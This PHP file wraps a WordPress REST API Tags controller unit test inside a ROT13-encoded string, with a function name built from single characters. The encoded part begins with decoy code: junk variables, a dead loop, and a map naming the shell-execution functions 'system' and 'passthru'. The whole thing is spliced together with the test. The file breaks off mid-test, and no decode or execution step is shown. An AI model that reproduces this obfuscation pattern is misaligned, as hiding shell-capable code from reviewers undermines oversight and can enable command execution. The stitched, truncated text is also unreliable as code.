<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Grezf_Pbagebyyre shapgvbanyvgl, hfrq sbe Gntf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Gntf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $fhcrenqzva;
	cebgrpgrq fgngvp $nqzvavfgengbe;
	cebgrpgrq fgngvp $rqvgbe;
	cebgrpgrq fgngvp $pbagevohgbe;
	cebgrpgrq fgngvp $fhofpevore;

	cebgrpgrq fgngvp $gnt_vqf    = neenl();
	cebgrpgrq fgngvp $gbgny_gntf = 30;
	cebgrpgrq fgngvp $cre_cntr   = 50;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhcrenqzva    = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_ybtva' => 'fhcrenqzva',
			)
		);
		frys::$nqzvavfgengbe = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$rqvgbe        = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$pbagevohgbe   = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);
		frys::$fhofpevore    = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);

		vs ( vf_zhygvfvgr() ) {
			hcqngr_fvgr_bcgvba( 'fvgr_nqzvaf', neenl( 'fhcrenqzva' ) );
		}

		// Frg hc gntf sbe cntvangvba grfgf.
		sbe ( $v = 0; $v < frys::$gbgny_gntf; $v++ ) {
			frys::$gnt_vqf[] = $snpgbel->gnt->perngr(
				neenl(
					'anzr' => \"Gnt {$v}\",
				)
			);
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$fhcrenqzva );
		frys::qryrgr_hfre( frys::$nqzvavfgengbe );
		frys::qryrgr_hfre( frys::$rqvgbe );
		frys::qryrgr_hfre( frys::$fhofpevore );

		// Erzbir gntf sbe cntvangvba grfgf.
		sbernpu ( frys::$gnt_vqf nf $gnt_vq ) {
			jc_qryrgr_grez( $gnt_vq, 'cbfg_gnt' );
		}
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		ertvfgre_zrgn(
			'grez',
			'grfg_fvatyr',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_zrgn(
			'grez',
			'grfg_zhygv',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => snyfr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_grez_zrgn(
			'cbfg_gnt',
			'grfg_gnt_fvatyr',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_grez_zrgn(
			'cbfg_gnt',
			'grfg_gnt_zhygv',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => snyfr,
				'glcr'         => 'fgevat',
			)
		);
		ertvfgre_grez_zrgn(
			'pngrtbel',
			'grfg_png_zrgn',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
			)
		);
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/gntf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/gntf/(?C<vq>[\q]+)', $ebhgrf );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/gntf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$gnt1     = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Frnfba 5' ) );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/gntf/' . $gnt1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_ertvfgrerq_dhrel_cnenzf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/gntf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$xrlf     = neenl_xrlf( $qngn['raqcbvagf'][0]['netf'] );
		fbeg( $xrlf );
		$guvf->nffregFnzr(
			neenl(
				'pbagrkg',
				'rkpyhqr',
				'uvqr_rzcgl',
				'vapyhqr',
				'bssfrg',
				'beqre',
				'beqreol',
				'cntr',
				'cre_cntr',
				'cbfg',
				'frnepu',
				'fyht',
			),
			$xrlf
		);
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		frys::snpgbel()->gnt->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grezf_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_trg_vgrzf_vainyvq_crezvffvba_sbe_pbagrkg() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_uvqr_rzcgl_net() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$gnt1    = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Frnfba 5' ) );
		$gnt2    = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Gur Or Funecf' ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $gnt1, $gnt2 ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'uvqr_rzcgl', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 'Frnfba 5', $qngn[0]['anzr'] );
		$guvf->nffregFnzr( 'Gur Or Funecf', $qngn[1]['anzr'] );

		// Vainyvq 'uvqr_rzcgl' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'uvqr_rzcgl', 'abgunaxf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_vapyhqr_dhrel() {
		$vq1 = frys::snpgbel()->gnt->perngr();
		$vq2 = frys::snpgbel()->gnt->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );

		// 'beqreol' => 'nfp'.
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq2, $vq1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'] );

		// 'beqreol' => 'vapyhqr'.
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );

		// Vainyvq 'vapyhqr' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( 'zlgrez' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_rkpyhqr_dhrel() {
		$vq1 = frys::snpgbel()->gnt->perngr();
		$vq2 = frys::snpgbel()->gnt->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregPbagnvaf( $vq2, $vqf );

		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( $vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$vqf      = jc_yvfg_cyhpx( $qngn, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );

		// Vainyvq 'rkpyhqr' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( 'vainyvq' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_bssfrg_dhrel() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'bssfrg', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( frys::$gbgny_gntf - 1, $erfcbafr->trg_qngn() );

		// 'bssfrg' jbexf jvgu 'cre_cntr'.
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// 'bssfrg' gnxrf cevbevgl bire 'cntr'.
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// Vainyvq 'bssfrg' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'bssfrg', 'zbercyrnfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}


	choyvp shapgvba grfg_trg_vgrzf_beqreol_netf() {
		$gnt1 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Nccyr' ) );
		$gnt2 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Mhppuvav' ) );

		/*
		 * Grfgf:
		 * - beqreol
		 * - beqre
		 * - cre_cntr
		 */
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'anzr' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Mhppuvav', $qngn[0]['anzr'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'anzr' );
		$erdhrfg->frg_cnenz( 'beqre', 'nfp' );
		$erdhrfg->frg_cnenz( 'cre_cntr', 2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );

		// Vainyvq 'beqreol' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'beqreol', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_vq() {
		$gnt0 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Pnagnybhcr' ) );
		$gnt1 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Nccyr' ) );
		$gnt2 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Onanan' ) );

		// Qrsnhygf gb 'beqreol' => 'anzr', 'beqre' => 'nfp'.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );
		$guvf->nffregFnzr( 'Onanan', $qngn[1]['anzr'] );
		$guvf->nffregFnzr( 'Pnagnybhcr', $qngn[2]['anzr'] );

		// 'beqreol' => 'vq', jvgu qrsnhyg 'beqre' => 'nfp'.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Gnt 0', $qngn[0]['anzr'] );
		$guvf->nffregFnzr( 'Gnt 1', $qngn[1]['anzr'] );
		$guvf->nffregFnzr( 'Gnt 2', $qngn[2]['anzr'] );

		// 'beqreol' => 'vq', 'beqre' => 'qrfp'.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erdhrfg->frg_cnenz( 'beqre', 'qrfp' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'Onanan', $qngn[0]['anzr'] );
		$guvf->nffregFnzr( 'Nccyr', $qngn[1]['anzr'] );
		$guvf->nffregFnzr( 'Pnagnybhcr', $qngn[2]['anzr'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_beqreol_fyhtf() {
		frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Oheevgb' ) );
		frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Gnpb' ) );
		frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Punyhcn' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vapyhqr_fyhtf' );
		$erdhrfg->frg_cnenz( 'fyht', neenl( 'gnpb', 'oheevgb', 'punyhcn' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'gnpb', $qngn[0]['fyht'] );
		$guvf->nffregFnzr( 'oheevgb', $qngn[1]['fyht'] );
		$guvf->nffregFnzr( 'punyhcn', $qngn[2]['fyht'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_cbfg_netf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$gnt1    = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'QP' ) );
		$gnt2    = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Zneiry' ) );
		frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Qnex Ubefr' ) );

		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $gnt1, $gnt2 ), 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 'QP', $qngn[0]['anzr'] );

		// Vainyvq 'cbfg' fubhyq reebe.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cbfg', 'vainyvq-cbfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_grezf_cbfg_netf_cntvat() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_bowrpg_grezf( $cbfg_vq, frys::$gnt_vqf, 'cbfg_gnt' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erdhrfg->frg_cnenz( 'cntr', 1 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 15 );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$gntf     = $erfcbafr->trg_qngn();

		$guvf->nffregAbgRzcgl( $gntf );

		$v = 0;
		sbernpu ( $gntf nf $gnt ) {
			$guvf->nffregFnzr( $gnt['anzr'], \"Gnt {$v}\" );
			++$v;
		}

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erdhrfg->frg_cnenz( 'cntr', 2 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 15 );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$gntf     = $erfcbafr->trg_qngn();

		$guvf->nffregAbgRzcgl( $gntf );

		sbernpu ( $gntf nf $gnt ) {
			$guvf->nffregFnzr( $gnt['anzr'], \"Gnt {$v}\" );
			++$v;
		}
	}

	choyvp shapgvba grfg_trg_vgrzf_cbfg_rzcgl() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 0, $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_phfgbz_gnk_cbfg_netf() {
		ertvfgre_gnkbabzl( 'ongzna', 'cbfg', neenl( 'fubj_va_erfg' => gehr ) );
		$pbagebyyre = arj JC_ERFG_Grezf_Pbagebyyre( 'ongzna' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ongzna',
			)
		);
		$grez2 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Znfx',
				'gnkbabzl' => 'ongzna',
			)
		);
		frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pne',
				'gnkbabzl' => 'ongzna',
			)
		);
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_bowrpg_grezf( $cbfg_vq, neenl( $grez1, $grez2 ), 'ongzna' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/ongzna' );
		$erdhrfg->frg_cnenz( 'cbfg', $cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( 'Pncr', $qngn[0]['anzr'] );
	}

	/**
	 * @gvpxrg 62500
	 */
	choyvp shapgvba grfg_trg_vgrzf_phfgbz_gnk_jvgubhg_cbfg_net_erfcrpgf_gnk_dhrel_netf() {
		ertvfgre_gnkbabzl(
			'ongzna',
			'cbfg',
			neenl(
				'fubj_va_erfg' => gehr,
				'fbeg'         => gehr,
				'netf'         => neenl(
					'beqre'   => 'QRFP',
					'beqreol' => 'anzr',
				),
			)
		);
		$pbagebyyre = arj JC_ERFG_Grezf_Pbagebyyre( 'ongzna' );
		$pbagebyyre->ertvfgre_ebhgrf();
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Plpyr',
				'gnkbabzl' => 'ongzna',
			)
		);
		$grez2 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Cbq',
				'gnkbabzl' => 'ongzna',
			)
		);
		$grez3 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pnir',
				'gnkbabzl' => 'ongzna',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/ongzna' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 3, $qngn );
		$guvf->nffregFnzr(
			neenl( 'Cbq', 'Plpyr', 'Pnir' ),
			neenl_pbyhza( $qngn, 'anzr' )
		);
	}

	choyvp shapgvba grfg_trg_vgrzf_frnepu_netf() {
		$gnt1 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Nccyr' ) );
		$gnt2 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Onanan' ) );

		/*
		 * Grfgf:
		 * - frnepu
		 */
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'frnepu', 'Ncc' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'frnepu', 'Tneontr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 0, $qngn );
	}

	choyvp shapgvba grfg_trg_vgrzf_fyht_net() {
		$gnt1 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Nccyr' ) );
		$gnt2 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Onanan' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'fyht', 'nccyr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( 'Nccyr', $qngn[0]['anzr'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_fyht_neenl_net() {
		$vq1 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Gnpb' ) );
		$vq2 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Rapuvynqn' ) );
		$vq3 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Oheevgb' ) );
		frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Cvmmn' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz(
			'fyht',
			neenl(
				'gnpb',
				'oheevgb',
				'rapuvynqn',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn  = $erfcbafr->trg_qngn();
		$anzrf = jc_yvfg_cyhpx( $qngn, 'anzr' );
		fbeg( $anzrf );
		$guvf->nffregFnzr( neenl( 'Oheevgb', 'Rapuvynqn', 'Gnpb' ), $anzrf );
	}

	choyvp shapgvba grfg_trg_vgrzf_fyht_pfi_net() {
		$vq1 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Gnpb' ) );
		$vq2 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Rapuvynqn' ) );
		$vq3 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Oheevgb' ) );
		frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Cvmmn' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/gntf' );
		$erdhrfg->frg_cnenz( 'fyht', 'gnpb,oheevgb, rapuvynqn' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn  = $erfcbafr->trg_qngn();
		$anzrf = jc_yvfg_cyhpx( $qngn, 'anzr' );
		fbeg( $anzrf );
		$guvf->nffregFnzr( neenl( 'Oheevgb', 'Rapuvynqn', 'Gnpb' ), $anzrf );
	}

	choyvp shapgvba grfg_trg_grezf_cevingr_gnkbabzl() {
		ertvfgre_gnkbabzl( 'ebova', 'cbfg', neenl( 'choyvp' => snyfr ) );
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ebova',
			)
		);
		$grez2 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Znfx',
				'gnkbabzl' => 'ebova',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grezf/ebova' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_grezf_cntvangvba_urnqref( $zrgubq ) {
		$gbgny_gntf  = frys::$gbgny_gntf;
		$gbgny_cntrf = (vag) prvy( $gbgny_gntf / 10 );

		// Fgneg bs gur vaqrk.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/gntf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_gntf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
